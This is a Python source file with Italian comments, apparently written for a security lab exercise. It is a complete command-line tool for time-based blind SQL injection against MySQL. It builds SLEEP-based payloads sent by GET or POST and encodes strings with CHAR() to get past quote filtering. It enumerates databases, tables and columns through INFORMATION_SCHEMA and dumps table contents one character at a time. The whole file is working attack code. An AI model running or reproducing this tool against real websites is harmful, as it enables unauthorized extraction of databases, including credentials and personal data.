import requests
import datetime
import numpy as np
#import binascii

#Usando python bisogna ricordarsi di convertire tutti gli indici usati come interi in str prima di concatenarli

isGet = True

#payload base
#http://192.168.33.10/sqli/time_based_blind.php?email=arthur@guide.com

#Trova il valore di una cella di una tabella, dopo aver trovato il DB, la tabella e la colonna.
def findCellValue(url, tabledb_name, row, column_name, sleeptime):
    print("findCellValue length")
    len=0
    undersc = []  #Vettore di caratteri underscore
    concatList = ["CHAR(", "95"]
    for i in range(1, 50):
        undersc.append('_')

        #Essendo che gli ' sono sanitizzati, si aggira il problema convertendo il valore dell'undescore
        #in decimale usando la funzione CHAR e lo concateno alla query
        #______ con CONCAT 
        concatStr="".join(concatList) + ")"
        concatList.append(",95")
        
        #A seconda del comando passato eseguo le query o in metodo GET o in metodo POST
        if(isGet):
            payload = '\' AND (SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ') -- -'
        else:            
            payload={
                'destin':'(SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ")",
                'msg':'msg'
            }

            #print(payload)

        #Quando la query fa a buon fine salvo la lunghezza trovata ( es.nome lenght nome DB )
        if(request(url, payload, sleeptime)):
            len=i
            print(len)
            break

    print("findCellValue value")
    string = []
    for pos in range(0, len):    #posizione del carattere
        for i in range(46, 122):    #char in codifica ascii

            #Nuovamente ricontrollo con che metodo invio le query
            if(isGet):
                payload='\' AND IF(ORD(MID((SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1),' + str(pos+1) + ', 1))=' + str(i) + ', SLEEP('+str(sleeptime)+'), SLEEP(0))-- -'
            else:
                payload={
                    'destin':'IF(ORD(MID((SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1),' + str(pos+1) + ', 1))=' + str(i) + ', SLEEP('+str(sleeptime)+'), SLEEP(0))',
                    'msg':'msg'
                }
            #Se la query va a buon fine, aggiungo il carattere trovato alla stringa
            if(request(url, payload, sleeptime)):
                string.append(chr(i))
                print(string)
                break

    
    return ''.join(string) #Compatto tutti i caratteri
    
#Trova numero delle righe di una tabella
def findNumRows(url, tabledb_name, sleeptime):
    print("findNumRows")
    numrows=0
    for i in range(1, 100):
        if(isGet):
            payload = '\' AND IF((SELECT COUNT(*) FROM '+ tabledb_name +')=' + str(i) + ', SLEEP('+ str(sleeptime) +'), SLEEP(0)) -- -'
        else:
            payload={
                'destin':'IF((SELECT COUNT(*) FROM '+ tabledb_name +')=' + str(i) + ', SLEEP('+ str(sleeptime) +'), SLEEP(0))',
                'msg':'cdef'
            }
        #Quando la query va a buon fine, salvo il numero di righe trovate e esco dal ciclo
        if(request(url, payload, sleeptime)):
            numrows=i
            break

    #print(numrows)
    return numrows

#Effettua la richiesta al sito per la ricerca dei valori/db/tabelle
def request(url, payload, sleeptime):   #sleeptime deriva da calcRitardo
    elapsed = requestTime(url, payload) #elapsed deriva da requestTime
    print(elapsed) #funz tempo richiesta

    #Ritorna T/F, confronto il tempo di risposta con un'oggetto tempo dai noi creato
    return elapsed > datetime.timedelta(seconds=sleeptime)

#Effettua una richiesta e ritorna il tempo di risposta  
def requestTime(url, payload):
    #costruire il payload
    #inviare richiesta a server
    #ans = requests.get('http://192.168.33.10/sqli/time_based_blind.php?email=arthur@guide.com\' AND SLEEP(1)-- -')

    #Ans è un'oggetto della risposta alla richiesta che, tra gli altri, contiene il tempo di risposta che a noi serve
    if(isGet):
        ans = requests.get(url + payload)
    else:
        #richiesta in post
        ans = requests.post(url, data=payload)
    return ans.elapsed #funz tempo richiesta

#Ritorna i nomi delle colonne
def findColumnNames(url, dbname, tablename, sleeptime):
    cols = []
    numCols = findNumRows(url, "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), sleeptime)
    for i in range(0, numCols):
        cols.append(findCellValue(url, "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), i, "column_name", sleeptime))    
    return cols
    
#    templates = ["table='{1}' {0}", "table={1} {0}"]
#    templates[0].format("boh", "bbb") -> "cabbbio boh"

#stampa i nomi delle tabelle
def findTableNames(url, dbname, sleeptime):
    numTbls = findNumRows(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), sleeptime)
    print(numTbls)
    for i in range(0, numTbls):
        print(findCellValue(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), i, "table_name", sleeptime))

#stampa i nomi dei db
def findDbNames(url, sleeptime):
    numDbs = findNumRows(url, "INFORMATION_SCHEMA.SCHEMATA", sleeptime)
    for i in range(0, numDbs):
        print(findCellValue(url, "INFORMATION_SCHEMA.SCHEMATA", i, "schema_name", sleeptime))
    
#stampa il contenuto di una tabella
def findTableContent(url, dbname, tablename, columns, sleeptime):
    numrows=findNumRows(url, tablename, sleeptime)
    for temp in range(0, numrows):
        tempRow=[]
        for column_name in columns:
            tempRow.append(findCellValue(url, dbname+"."+tablename, temp, column_name, sleeptime))
        print(tempRow)


def convertToChar(string):
    concatList = ["CHAR("]
    stringV = list(string)

    concatList.append(str(ord(stringV[0])))

    for c in range(1, len(stringV)):
        concatList.append("," + str(ord(stringV[c])))

    return "".join(concatList) + ")"


def calcRitardo(url):
    #dichiarazione array con libreria numpy (gestione avanzata di array e numeri)
    times = np.array([])

    #10 richieste per test
    for i in range(0, 10):
        times = np.append(times, requestTime(url, "").total_seconds())


    #toglie due teste e due code
    times = np.delete(times, np.argmax(times))
    times = np.delete(times, np.argmax(times))
    times = np.delete(times, np.argmin(times))
    times = np.delete(times, np.argmin(times))

    print(10*np.mean(times))
    return 10*np.mean(times)

########################################

#Codice per la creazione di comandi da shell
#Iniz parser 
import argparse
parser = argparse.ArgumentParser(description="Description of prog")
# -tbl "url", db  -----> funzione che stampa tutte le tbl del db
parser.add_argument('-tbl', help='stampa tutte le tbl del db. Uso: python tool.py -tbl [URL] [Nome DB]', dest="tbl", nargs=2)

# -all "url", db , tabl -------> funzione che stampa i dati della tabella
parser.add_argument('-all', help='stampa i dati della tabella. Uso: python tool.py -all [URL] [Nome DB] [Nome Tabella]', dest="all", nargs=3)

# -db "url" -------> funzione che stampa i db
parser.add_argument('-db', help='stampa elenco dei db. Uso: python tool.py -db [URL]', dest="db", nargs=1)

# -post --- se si vuole fare le richieste con metodo POST
#parser.add_argument('--post', help='Usa metodo POST invece di GET', dest="post", const=1, default=0, nargs='?')

parser.add_argument('--post', dest='post', action='store_true', default=False)

args = parser.parse_args()

if(args.post):
    isGet = False
    #print(findNumRows(args.db[0], "INFORMATION_SCHEMA.SCHEMATA"))

if(args.tbl is not None):
    n=calcRitardo(args.tbl[0])
    findTableNames(args.tbl[0], args.tbl[1], n)

if(args.all is not None):
    n=calcRitardo(args.all[0])
    colNames = findColumnNames(args.all[0], args.all[1], args.all[2], n)
    print(colNames)
    findTableContent(args.all[0], args.all[1], args.all[2], colNames, n)

if(args.db is not None):
    n=calcRitardo(args.db[0])
    findDbNames(args.db[0], n)

